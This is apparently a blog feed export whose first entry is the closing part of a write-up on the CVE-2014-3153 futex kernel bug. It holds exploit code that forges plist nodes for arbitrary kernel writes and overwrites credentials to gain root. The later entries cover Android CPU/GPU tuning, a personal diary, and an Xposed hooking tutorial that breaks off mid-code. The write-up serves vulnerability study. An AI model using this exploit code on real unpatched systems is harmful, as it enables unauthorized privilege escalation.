<p>最后在该线程中通过修改线程的thread_info.task_struct -&gt; cred -&gt; secutiry进行提权，修改内容如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">credbuf.uid = <span class="number">0</span>;</span><br><span class="line">credbuf.gid = <span class="number">0</span>;</span><br><span class="line">credbuf.suid = <span class="number">0</span>;</span><br><span class="line">credbuf.sgid = <span class="number">0</span>;</span><br><span class="line">credbuf.euid = <span class="number">0</span>;</span><br><span class="line">credbuf.egid = <span class="number">0</span>;</span><br><span class="line">credbuf.fsuid = <span class="number">0</span>;</span><br><span class="line">credbuf.fsgid = <span class="number">0</span>;</span><br><span class="line">credbuf.cap_inheritable.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_inheritable.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_permitted.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_permitted.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_effective.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_effective.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_bset.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_bset.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">securitybuf.osid = <span class="number">1</span>;</span><br><span class="line">securitybuf.sid = <span class="number">1</span>;</span><br><span class="line">taskbuf.pid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="判断cpu进入内核">判断cpu进入内核</h3><p>当系统调用syscall时，<code>/proc/PID/task/TID/status</code>中voluntary_ctxt_switches会增加<br>在Linux中可以通过/proc看出cpu切入/切出次数，<br>比如 PID = 27288，用cat 命令搞一下：</p>
<pre><code>cat /<span class="keyword">proc</span>/<span class="number">27288</span>/status
...
voluntary_ctxt_switches: <span class="number">9950</span>
nonvoluntary_ctxt_switches: <span class="number">17104</span>
...
</code></pre><p>这里的9950和17104分别就是切入/切出 CPU的次数。<br>除了status之外，还可以看/proc/27288/schedstat 字段：</p>
<pre><code>cat /<span class="keyword">proc</span>/<span class="number">27288</span>/schedstat
<span class="number">1119480311</span> <span class="number">724745506</span> <span class="number">27054</span>
</code></pre><p>此处 27054 就是上面两个数值的和，代表切入切出总数值。</p>
<h3 id="伪终端">伪终端</h3><p>通过创建伪终端读数据，使线程阻塞，在修改addr_limit的过程中就是通过这种方法进行等待修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HACKS_fdm = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"> </span><br><span class="line">unlockpt(HACKS_fdm);    <span class="comment">// 允许对伪终端从设备的访问</span></span><br><span class="line">slavename = ptsname(HACKS_fdm); <span class="comment">// 函数用于在给定主伪终端设备的文件描述符时，找到从伪终端设备的路径名</span></span><br><span class="line">open(slavename, O_RDWR);</span><br><span class="line">...</span><br><span class="line">read(HACKS_fdm, readbuf, <span class="keyword">sizeof</span> readbuf);</span><br></pre></td></tr></table></figure>
<h3 id="伪造节点">伪造节点</h3><p>利用代码中setup_exploit方法生成的两个可控节点方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">setup_exploit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> mem)</span> </span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem - <span class="number">0x04</span>)) = <span class="number">0x81</span>;   <span class="comment">// prio = 129-120 = 9</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x00</span>)) = mem + <span class="number">0x20</span>; <span class="comment">// rt_waiter9.prio_list.next = rt_waiter13</span></span><br><span class="line">    <span class="comment">//  + 0x04 = prio_list.prev</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x08</span>)) = mem + <span class="number">0x28</span>; <span class="comment">// rt_waiter9.node_list.next = rt_waiter13.node_list</span></span><br><span class="line">    <span class="comment">// + 0x0c = node_list.prev</span></span><br><span class="line"> </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x1c</span>)) = <span class="number">0x85</span>;   <span class="comment">// prio = 133-120 = 13</span></span><br><span class="line">    <span class="comment">// + 0x20 = prio_list.next</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x24</span>)) = mem;    <span class="comment">// rt_waiter13.prio_list.prev = rt_waiter9</span></span><br><span class="line">    <span class="comment">// + 0x28 = node_list.next</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x2c</span>)) = mem + <span class="number">8</span>;    <span class="comment">// rt_waiter13.node_list.prev = rt_waiter9.node_list</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是根据plist_node结构生成的两个节点，优先级分别为9和13，plist_node结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> plist_node &#123;</span><br><span class="line">    <span class="keyword">int</span> prio;   <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">struct</span> list_head    prio_list;  <span class="comment">// 0x8</span></span><br><span class="line">    <span class="keyword">struct</span> list_head    node_list;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>整个利用代码都是通过向这两个节点中插入来读写内核的，其中参数long mem指向的是prio=9的prio_list，mem-4处填写的是其优先级。</p>
<h3 id="arm移植x86">arm移植x86</h3><p>x86和arm唯一区别就是thread_info结构不同，x86的thread_info结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> thread_info &#123;</span><br><span class="line">    <span class="keyword">struct</span> task_struct  *task;          <span class="comment">/* main task structure */</span></span><br><span class="line">    <span class="keyword">struct</span> exec_domain  *exec_domain;   <span class="comment">/* execution domain */</span></span><br><span class="line">    __u32           flags;              <span class="comment">/* low level flags */</span></span><br><span class="line">    __u32           status;             <span class="comment">/* thread synchronous flags */</span></span><br><span class="line">    __u32           cpu;                <span class="comment">/* current CPU */</span></span><br><span class="line">    <span class="keyword">int</span>             preempt_count;      <span class="comment">/* 0 =&gt; preemptable,</span><br><span class="line">                                   &lt;0 =&gt; BUG */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  addr_limit;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>所以稍作修改就能移植过去，代码参考<a href="https://github.com/lieanu/CVE2014-3153" target="_blank" rel="external">https://github.com/lieanu/CVE2014-3153</a></p>
<h2 id="总结">总结</h2><ol>
<li>栈复用技巧（sendmmsg函数的使用）</li>
<li>利用链表达到任意地址写的技巧</li>
<li>修改addr_limit及cred技巧，利用技巧很通用，基本适合任何能够泄露内核地址的漏洞</li>
<li>gdb内核调试</li>
</ol>
<h2 id="参考">参考</h2><p><a href="http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/" target="_blank" rel="external">Exploiting the Futex Bug and uncovering Towelroot</a><br><a href="http://blog.topsec.com.cn/ad_lab/cve2014-3153/" target="_blank" rel="external">cve2014-3153 漏洞之详细分析与利用</a><br><a href="http://thecjw.0ginr.com/blog/archives/564" target="_blank" rel="external">CVE-2014-3153笔记</a><br><a href="http://blog.nativeflow.com/the-futex-vulnerability" target="_blank" rel="external">The Futex Vulnerability</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="简介">简介</h2><p>漏洞是14年5月份爆，属于linux内核漏洞，影响范围非常广，包括linux系统（内核版本3.14.5之前）和andorid系统（系统版本4.4之前）。受影响的系统可能被直接DOS，精心设计可以获取root权限，如安卓root工具tow]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓CPU,GPU,IO,缓存工作模式查看与修改]]></title>
    <link href="http://blog.idhyt.com/2016/01/10/andorid-work-mode-cpu-gpu-io/"/>
    <id>http://blog.idhyt.com/2016/01/10/andorid-work-mode-cpu-gpu-io/</id>
    <published>2016-01-10T14:31:24.000Z</published>
    <updated>2016-01-14T09:44:42.000Z</updated>
    <content type="html"><![CDATA[<h2 id="CPU工作模式">CPU工作模式</h2><h3 id="简介">简介</h3><p>在android系统的耗电量排行里，cpu的耗电占了比较大的一部分比例，也就是说，cpu的使用率和使用频率将直接或间接的影响电量的分配和使用，同时也会影响系统的流畅度。android-sdk中没有为android的开发者提供类似cpu管理的功能，但是当下很多省电类应用或专业的cpu管理软件都提供了cpu的降频甚至是超频的功能。</p>
<h3 id="主要的几种CPU调控模式">主要的几种CPU调控模式</h3><ul>
<li>ondemand（按需响应模式）：系统默认的超频模式，在最大最小频率之间自动调整 (有高级设置 )</li>
<li>interactive（交流循环模式）：只要手机运行频率直接上最高值，然后CPU负荷慢慢降低（系统响应最快，耗电多一些）</li>
<li>conservative（保守模式）：随着CPU负荷加大，逐步提升频率到最高，然后降至最低（系统响应快，耗电比I模式省）</li>
<li>smartass：是I和C模式的升级，该模式在比i模式不差的响应的前提下会做到了更加省电</li>
<li>performance（高性能模式）：高性能模式，按你设定范围的最好频率运行(机器最流畅,耗电也最大)</li>
<li>userspace（用户隔离模式）：当setcpu处于非工作状态时控制cpu速度的一种方法，官方建议最好不使用该选项</li>
<li>powersave（省电模式）：按设定最小频率低负荷运行，省电但系统响应速度慢</li>
</ul>
<h3 id="CPU模式查看">CPU模式查看</h3><p>查看命令<code>cat [%cpuFreqPath%]/cpuinfo_cur_freq</code></p>
<pre><code>cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/cpuinfo_cur_freq   (当前cpu频率)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/cpuinfo_max_freq  (最大cpu频率)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/cpuinfo_min_freq  (最小cpu频率)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/related_cpus  (cpu数量标号,从<span class="number">0</span>开始,如果是双核,结果为<span class="number">0</span>,<span class="number">1</span>)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/scaling_available_frequencies  (cpu所有可用频率)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/scaling_available_governors  (cpu所有可用调控模式)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/scaling_governor (当前使用哪种调控模式)
cat <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq/cpuinfo_transition_latency (变频延迟)
</code></pre><p>MI3的cpu支持6种模式：</p>
<pre><code><span class="title">interactive</span> conservative ondemand powersave userspace performance
</code></pre><p>普通的andriod机默认的CPU模式为<code>ondemand</code>，MIUI 7的CPU模式为<code>interactive</code>，该模式下系统响应最快，所以最直观的效果就是系统更流畅。360手机的CPU也是用的该模式。</p>
<h3 id="CPU模式更改">CPU模式更改</h3><p>更改CPU模式需要root权限，如更改cpu调控模式：</p>
<pre><code>echo <span class="string">"你想使用的调控模式"</span> <span class="regexp">/sys/</span>devices<span class="regexp">/system/</span>cpu<span class="regexp">/cpu0/</span>cpufreq<span class="regexp">/scaling_governor</span>
</code></pre><p>需要注意的是，重启后修改的会还原。</p>
<h2 id="GPU工作模式">GPU工作模式</h2><p>GPU渲染对电量的影响非常大，长时间使用OPENGL绘制3D动画也是非常非常耗电的，在足够日常使用的前提下适当的调节GPU，会降低手机发热量，达到省电效果。</p>
<h3 id="查看GPU可用频率">查看GPU可用频率</h3><p>高通Gpu支持查看频率和更改，英伟达不支持。</p>
<p>目录<code>/sys/class/kgsl/kgsl-3d0</code>文件为例说明：</p>
<ul>
<li>gpuclk: This prints out the current clock rate for the GPU.</li>
<li>max_gpuclk: The maximum clock the GPU will pick.</li>
<li>idle_timer: We’re not going to touch this now but this value means the time after the GPU is used to keep the GPU in a ‘ready’ state. Set it too high and power will be terrible, set it too low and both power AND performance will be terrible. I’d just leave it alone.</li>
<li>pwrscale/avail_policies: This is a list of available algorithms used for calculating the optimal GPU frequency.</li>
<li>pwrscale/policy: This is the current algorithm used, probably trustzone. Trustzone means the algorithm is somewhere else out of the kernel so you won’t know what it’s actually doing.</li>
</ul>
<p>查看命令：</p>
<pre><code>cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/gpu_available_frequencies <span class="comment">//可用频率</span>
cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/max_gpuclk <span class="comment">//最大频率</span>
cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/gpuclk <span class="comment">//当前频率</span>
...
cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">2</span>d0/gpu_available_frequencies
</code></pre><h3 id="修改GPU频率">修改GPU频率</h3><p>修改gpu最大工作频率：</p>
<pre><code>echo <span class="number">200000000</span> &gt; /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/max_gpuclk
</code></pre><p>降频一般通过更改最大频率来实现的。</p>
<h2 id="IO_Scheduler">IO Scheduler</h2><p>io scheduler完全决定了磁盘的读写性能，而这对于用户体验的影响是极大的。</p>
<h3 id="I/O调度的几种算法">I/O调度的几种算法</h3><h4 id="cfq">cfq</h4><p>completely-fair-quening完全公平队列，是anticipatory模式的替代品，没有过多的做预测性调度，而是根据给定的进程io优先级，直接来分配操作的顺序。这个模式在linux上表现良好，但也许并不是最适合android的io调度模式，太强调均衡，而降低了连续读写数据的性能。高通默认的就是这个，强烈建议改掉，根本不适合移动设备。</p>
<h4 id="noop">noop</h4><p>这个调度模式会把所有的数据请求直接合并到一个简单的队列里。不适合有机械结构的存储器，因为没有优化顺序，会增加额外的寻道时间。属于最简单的一个调度模式，无视io操作优先级和复杂性，执行完一个再执行一个，如果读写操作繁多的话，就会造成效率降低。nvidia默认，有时候会造成顿卡，但是这个scheduler对省电比较有帮助。</p>
<h4 id="deadline">deadline</h4><p>顾名思义，用过期时间来排序io操作顺序，保证先出现的io请求有最短的延迟时间，相对于写操作，给读操作更优先的级别。是比较好的一个调度模式，性能不错。</p>
<h4 id="row">row</h4><p>read over write，这个scheduler会优先处理读的请求，在移动设备上读的请求远远多于并且重要于写的请求，并且随机读取速度很重要。这个governor允许单或者双线程的读写，在同时有读写的情况下优先保证读，比较适合移动设备。</p>
<h4 id="fiops">fiops</h4><p>fair-iops这个调度器虽然和cfq一样追求平均的优先级，但是是根据闪存设备重新设计的一个governor，各方面表现良好，是列出来的五个scheduler里面性能最好的一个，如果有，强烈推荐fiops。</p>
<h4 id="sio">sio</h4><p>simple－io在安卓上其实调度器越简单效果越好。sio就是最简单的一个调度器。不过还是有缺点的，就是随即读写性能不太好。在fiops出来以后，这个scheduler基本就被冷落了。</p>
<h3 id="查看调度算法">查看调度算法</h3><p>查看当前系统支持的IO调度算法</p>
<pre><code>dmesg | grep -i scheduler
&lt;<span class="number">6</span>&gt;<span class="string">[    0.364114]</span> C1 <span class="string">[      swapper/0, 1]</span> io scheduler noop registered
&lt;<span class="number">6</span>&gt;<span class="string">[    0.364120]</span> C1 <span class="string">[      swapper/0, 1]</span> io scheduler deadline registered
&lt;<span class="number">6</span>&gt;<span class="string">[    0.364131]</span> C1 <span class="string">[      swapper/0, 1]</span> io scheduler row registered (default)
&lt;<span class="number">6</span>&gt;<span class="string">[    0.364185]</span> C1 <span class="string">[      swapper/0, 1]</span> io scheduler cfq registered
&lt;<span class="number">6</span>&gt;<span class="string">[    0.364192]</span> C1 <span class="string">[      swapper/0, 1]</span> io scheduler test-iosched registered
</code></pre><p>查看当前系统的I/O调度方法</p>
<pre><code>cat <span class="regexp">/sys/</span>block<span class="regexp">/mmcblk0/</span>queue/scheduler
noop deadline [row] cfq test-iosched
</code></pre><p>其中[]为当前正在使用的调度方法</p>
<h3 id="更改调度方法">更改调度方法</h3><p>更改I/O当前系统调度方法:</p>
<pre><code>echo noop &gt; <span class="regexp">/sys/block</span><span class="regexp">/mmcblk0/queue</span><span class="regexp">/scheduler</span>
</code></pre><h2 id="Read_Ahead_Buffer">Read Ahead Buffer</h2><p>按理说缓存应该是越大越好，但是在安卓上好像不是这样，是越大越省电，越小系统越流畅。</p>
<h3 id="查看当前缓存">查看当前缓存</h3><pre><code>内置闪存：
cat <span class="regexp">/sys/</span>block<span class="regexp">/mmcblk0/</span>quene/read_ahead_kb

SD卡：
cat <span class="regexp">/sys/</span>block<span class="regexp">/mmcblk1/</span>quene/read_ahead_kb
</code></pre><h3 id="修改默认缓存">修改默认缓存</h3><pre><code>内置闪存：
<span class="built_in">echo</span> 你想要的大小 &gt; /sys/block/mmcblk0/quene/<span class="built_in">read</span>_ahead_kb

sd卡：
<span class="built_in">echo</span> 你想要的大小 &gt; /sys/block/mmcblk1/quene/<span class="built_in">read</span>_ahead_kb
</code></pre><p>MI3默认为512K，如果想省电可以设成2048k。</p>
<h2 id="Demo">Demo</h2><p>一个Demo用于查看和修改cpu,gpu,io,缓存，效果如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-cpu-gpu-io-123.jpg" alt="AndroidDeviceInfo"><br>源码查看: <a href="https://github.com/idhyt/AndroidDeviceInfo" target="_blank" rel="external">AndroidDeviceInfo</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="CPU工作模式">CPU工作模式</h2><h3 id="简介">简介</h3><p>在android系统的耗电量排行里，cpu的耗电占了比较大的一部分比例，也就是说，cpu的使用率和使用频率将直接或间接的影响电量的分配和使用，同时也会影响系统的流畅度。andro]]>
    </summary>
    
      <category term="android" scheme="http://blog.idhyt.com/tags/android/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我的2015]]></title>
    <link href="http://blog.idhyt.com/2016/01/01/diary-annual-summary-2015/"/>
    <id>http://blog.idhyt.com/2016/01/01/diary-annual-summary-2015/</id>
    <published>2015-12-31T18:40:11.000Z</published>
    <updated>2016-01-03T10:08:54.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;昨晚失眠，做了一个梦，仿佛回到了从前，也仿佛穿越到了不远的将来，半梦半醒中依稀记得是一个悬疑故事，里边很多熟悉的人，眯着眼睛拿着手机记录了一些情节，打算写篇小说。</p>
<hr>

<p>&#160; &#160; &#160; &#160;今年的跨年异常冷清，公司早早的都没有人，出去走了一圈，可能是有些晚的缘故，路边和商场都没有人，或许是我没走对路，又或许是太晚了，于是去吃了鸡肉卷外加四个鸡翅，迎接新年的到来。2016你好，2015再见。</p>
<hr>

<p>&#160; &#160; &#160; &#160;惯性思维的回想了下今年的生活轨迹，好像能想起来的真的挺少的，工作的缘故，业余生活也基本没有了，朋友越来越少，所有记住的东西也就没多少了。今年工作已经切到移动端了，但是感觉成长总是很慢很慢，越来越迷茫，好像想要的工作方式都要忘记了，生活上也有些烦恼，意外的惊喜与瞬间的跌落，然后莫名奇妙的删了别人的微信，总觉得自己对任何事情都能很理智的去控制，但在某个时刻依然会想那么多。那时候我有这样一种想法，放下工作出去走走，迷茫也好，逃避也罢，我甚至已经拿出地图研究好了如何完整的走完整个鸡形地图，可能一切的想法都是出去放松的借口，可能想那么多又有什么用呢。或许又是意外的去学了游泳将我注意力转到了游泳上边，慢慢的想法也没有那么强烈了，但是总觉得这种想法会在某个特定的时间点等我去做且不可不做。</p>
<hr>

<p>&#160; &#160; &#160; &#160;8月份请了年假回家了一周，顺便把身份证和驾驶证都换了，还办了护照和签证，回来后换了房子室友还有两条狗。再然后就是参加了新项目并且突然被派去北京出差了一个月，就在去北京的前一天我可是已经订好了去上海参加会议的机票了，朋友都约好了，真是个悲伤的故事，其实我真的还挺想去上海看看。北京的一个月出差也是记忆深刻，每天除了工作就是睡觉，总结下来就是忙成狗，好几个朋友都没有见。还有，天冷是测试吃货的最好环境，不吃冷啊，所有回来妥妥胖了6斤，还好减了下来了。毕业之前有在北京实习过将近一年，所以对北京还比较了解，在北京出差过程中也感受到了很多奇奇怪怪的想法和令人诧异的工作气氛，他们用成功学告诉你什么是梦想，告诉你要有追求，告诉你要表现出欲望，告诉你这些他都不care，我不能怂，可我特么连生活问题都还没解决让我拿什么画梦想，很多时候不是说对物质没有追求，而是不想把暂时得不到的东西看的太重，不是没有不行，而是有了更好。想到了之前看的一个故事，黄鼠狼在养鸡场的山崖边立了块碑，上面写着：“抛弃传统的禁锢，不勇敢的跳下去，你怎么知道自己不是一只鹰！” 接下来这畜生每天就在崖底吃着摔下来的鸡。这个故事告诉我们，阅读所谓的“心灵鸡汤”需要智商和智慧，大多鸡汤都是黄鼠狼炖的。这又是一个悲伤的故事。</p>
<hr>

<p>&#160; &#160; &#160; &#160;仔细想想最有成就感的事情好像就是把游泳学会了，还是蛙泳，不过也多亏了一个热心的大(shu)哥(shu)指导，不然我还是用狗刨的姿态在蛙泳。其中也间歇性的在跑步，不过跑步也要看状态，有时候一周每天都跑，有时候也会隔天跑，运行这种事情真的要随性，一旦以某种目的去运动，总觉得失去了很多心态上的东西，可能我是不喜欢有压力的感觉。游戏也没怎么玩了，年初在网咖冲的钱用到现在还有400多，想想都是坑，上半年倒是又玩了两个月的大话西游，不过最后把东西全卖了还赚了几百开钱，当时想想还挺开心的，后来我折合了下时间，平均一小时连10块钱都没赚到，这还是一个悲伤的故事。</p>
<hr>

<p>&#160; &#160; &#160; &#160;突然又是一年，总恍惚的觉得有些不可思议，前两天又看到了读研时候爬山拍的mv，又想到了那些欢乐的时光，那些熟悉的人，毕业以后就再也没有见到过了，人的惰性总会让人长久活在自己的世界里，忽然有天想去找个朋友聊聊天，我该去找谁，互联网时代，出门不带没有电话没有短信的手机也会没有安全感，作为一个互联网工作者，不是是幸运的还是不幸的。</p>
<hr>

<p>&#160; &#160; &#160; &#160;凌晨朋友圈又在刷新年祝福和新年愿望，又到许愿的时候了，翻了翻前几年总结写的愿望，一个都没有实现，再想想一直希望的事情，我特么连2011年的愿望都还没实现，满屏幕悲伤的故事，就不许愿了吧，怕想多了神灯也救不了我，如果必须有个愿望来证明2016来了，那么我就祝福我的朋友愿望都能如愿以偿吧，因为我是好人?雷锋:神灯。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;昨晚失眠，做了一个梦，仿佛回到了从前，也仿佛穿越到了不远的将来，半梦半醒中依稀记得是一个悬疑故事，里边很多熟悉的人，眯着眼睛拿着手机记录了一些情节，打算写篇小说。</p>
<hr>

<p>&#160; &#160; &]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed用法详解]]></title>
    <link href="http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/"/>
    <id>http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/</id>
    <published>2015-11-27T17:11:11.000Z</published>
    <updated>2015-12-30T09:31:02.000Z</updated>
    <content type="html"><![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框架，知道如何hook函数，并没有深入去使用，也不知道这个框架能用到哪种程度，最近详细的总结了下，简单来说就是，没有hook不到的地方，只有你想不到的地方。</p>
<h2 id="接管系统所有广播包">接管系统所有广播包</h2><p>&#160;&#160;&#160;&#160;在Android四大组件中，Broadcast是一种广泛运用的在应用程序之间传输信息的机制。而BroadcastReceiver 是对发送出来的Broadcast进行过滤接受并响应的一类组件。应用通过BroadcastReceiver对一个外部的事件做出响应，这是非常有意思的，当开机，锁屏等外部事件到来的时候，可以利用BroadcastReceiver进行相应的处理。如果你能接管所有的广播包，基本上就接管了整个系统的信息传输过程。广播包也是频繁唤醒手机的一个重要原因，通过管理这些广播包，可以达到省电效果。</p>
<p>通过阅读源代码中<br><a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/firewall/IntentFirewall.java#IntentFirewall" target="_blank" rel="external">IntentFirewall</a>这个类，126行代码开始有一些以<code>check</code>开头的方法，说明如下:</p>
<pre><code>This is called from ActivityManager to<span class="instruction"> check </span>if a start activity intent should be allowed. It is assumed the caller is already holding the global ActivityManagerService lock.
</code></pre><p>说明很清晰的告诉我们，所有activity启动时，会到这里做相应的检测是否被允许，因此我们hook掉<code>checkBroadcast</code>方法，就可以控制所有的广播包走向。checkBroadcast代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkBroadcast</span><span class="params">(Intent intent, <span class="keyword">int</span> callerUid, <span class="keyword">int</span> callerPid,</span><br><span class="line">    String resolvedType, <span class="keyword">int</span> receivingUid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> checkIntent(mBroadcastResolver, intent.getComponent(), TYPE_BROADCAST, intent, callerUid, callerPid, resolvedType, receivingUid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我通过hook该方法并获取到第一个参数<code>Intent intent</code>，然后就可以获取到广播类型，同时也可以获取到该广播的发送者(callerUid)和接受者(receivingUid)，hook代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.firewall.IntentFirewall"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"checkBroadcast"</span>,</span><br><span class="line">                Intent.class,   <span class="comment">// intent</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerUid</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerPid</span></span><br><span class="line">                String.class,   <span class="comment">// resolvedType</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// receivingUid</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> callerUid = (<span class="keyword">int</span>) param.args[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> receivingUid = (<span class="keyword">int</span>) param.args[<span class="number">4</span>];</span><br><span class="line">                XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"broadcast from "</span> + callerUid + <span class="string">" to "</span> + 